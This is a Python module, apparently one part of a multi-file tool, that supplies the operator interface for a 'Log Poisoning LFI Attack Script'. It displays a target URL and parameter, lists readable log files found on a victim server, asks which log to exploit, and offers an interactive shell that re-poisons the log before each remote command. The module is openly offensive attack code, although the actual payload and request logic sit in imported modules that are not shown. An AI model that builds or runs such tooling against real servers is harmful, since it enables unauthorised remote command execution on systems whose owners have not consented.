"""
User interface module for interactive and single-command modes.
Follows Single Responsibility Principle.
"""

from typing import List, Optional

from log_scanner import VulnerableLog
from command_executor import CommandExecutor


class UserInterface:
    """Handles user interaction and display."""
    
    @staticmethod
    def display_header(target_url: str, param: str):
        """Display application header."""
        print("\n" + "="*60)
        print("    Log Poisoning LFI Attack Script")
        print("="*60)
        print(f"[*] Target: {target_url}")
        print(f"[*] Parameter: {param}")
    
    @staticmethod
    def display_vulnerable_logs(vulnerable_logs: List[VulnerableLog]):
        """
        Display found vulnerable logs.
        
        Args:
            vulnerable_logs: List of vulnerable logs to display
        """
        print("\n" + "="*60)
        print("[+] Found readable log files:")
        print("="*60)
        
        for idx, log in enumerate(vulnerable_logs, 1):
            print(f"\n[{idx}] {log.description}")
            print(f"    Path: {log.path}")
            print(f"    Method: {log.method}")
            print(f"    Preview: {log.content_preview[:80]}...")
        
        print("\n" + "="*60)
    
    @staticmethod
    def select_log(vulnerable_logs: List[VulnerableLog]) -> Optional[VulnerableLog]:
        """
        Let user select a log to exploit.
        
        Args:
            vulnerable_logs: List of vulnerable logs
            
        Returns:
            Selected log or None if cancelled
        """
        if not vulnerable_logs:
            print("[-] No vulnerable logs found")
            return None
        
        UserInterface.display_vulnerable_logs(vulnerable_logs)
        
        while True:
            try:
                choice = input(f"Select log to exploit (1-{len(vulnerable_logs)}) [1]: ").strip()
                
                if not choice:
                    choice = "1"
                
                choice_idx = int(choice)
                
                if 1 <= choice_idx <= len(vulnerable_logs):
                    selected = vulnerable_logs[choice_idx - 1]
                    print(f"\n[+] Selected: {selected.description}")
                    print(f"[+] Path: {selected.path}")
                    return selected
                else:
                    print(f"[-] Please enter a number between 1 and {len(vulnerable_logs)}")
                    
            except ValueError:
                print("[-] Please enter a valid number")
            except KeyboardInterrupt:
                print("\n[!] Cancelled")
                return None
    
    @staticmethod
    def run_interactive_shell(executor: CommandExecutor, log_path: str, method: str):
        """
        Run interactive command shell.
        
        Args:
            executor: Command executor instance
            log_path: Path to the log file
            method: Poisoning method name
        """
        print("\n" + "="*60)
        print("[+] Starting interactive shell")
        print(f"[*] Log file: {log_path}")
        print(f"[*] Poison method: {method}")
        print("[*] Type 'exit' or 'quit' to quit")
        print("[!] Log is re-poisoned before each command")
        print("="*60 + "\n")
        
        while True:
            try:
                cmd = input("\033[1;32m$\033[0m ")
                
                if cmd.lower() in ['exit', 'quit']:
                    print("[*] Exiting...")
                    break
                
                if not cmd.strip():
                    continue
                
                output = executor.execute(cmd)
                if output:
                    print(output)
                print()
                
            except KeyboardInterrupt:
                print("\n[!] Interrupted")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
    
    @staticmethod
    def run_single_command(executor: CommandExecutor, command: str):
        """
        Execute a single command and display output.
        
        Args:
            executor: Command executor instance
            command: Command to execute
        """
        print(f"\n[*] Executing single command: {command}")
        output = executor.execute(command)
        print("\n[+] Command output:")
        print("-" * 60)
        print(output)
        print("-" * 60)
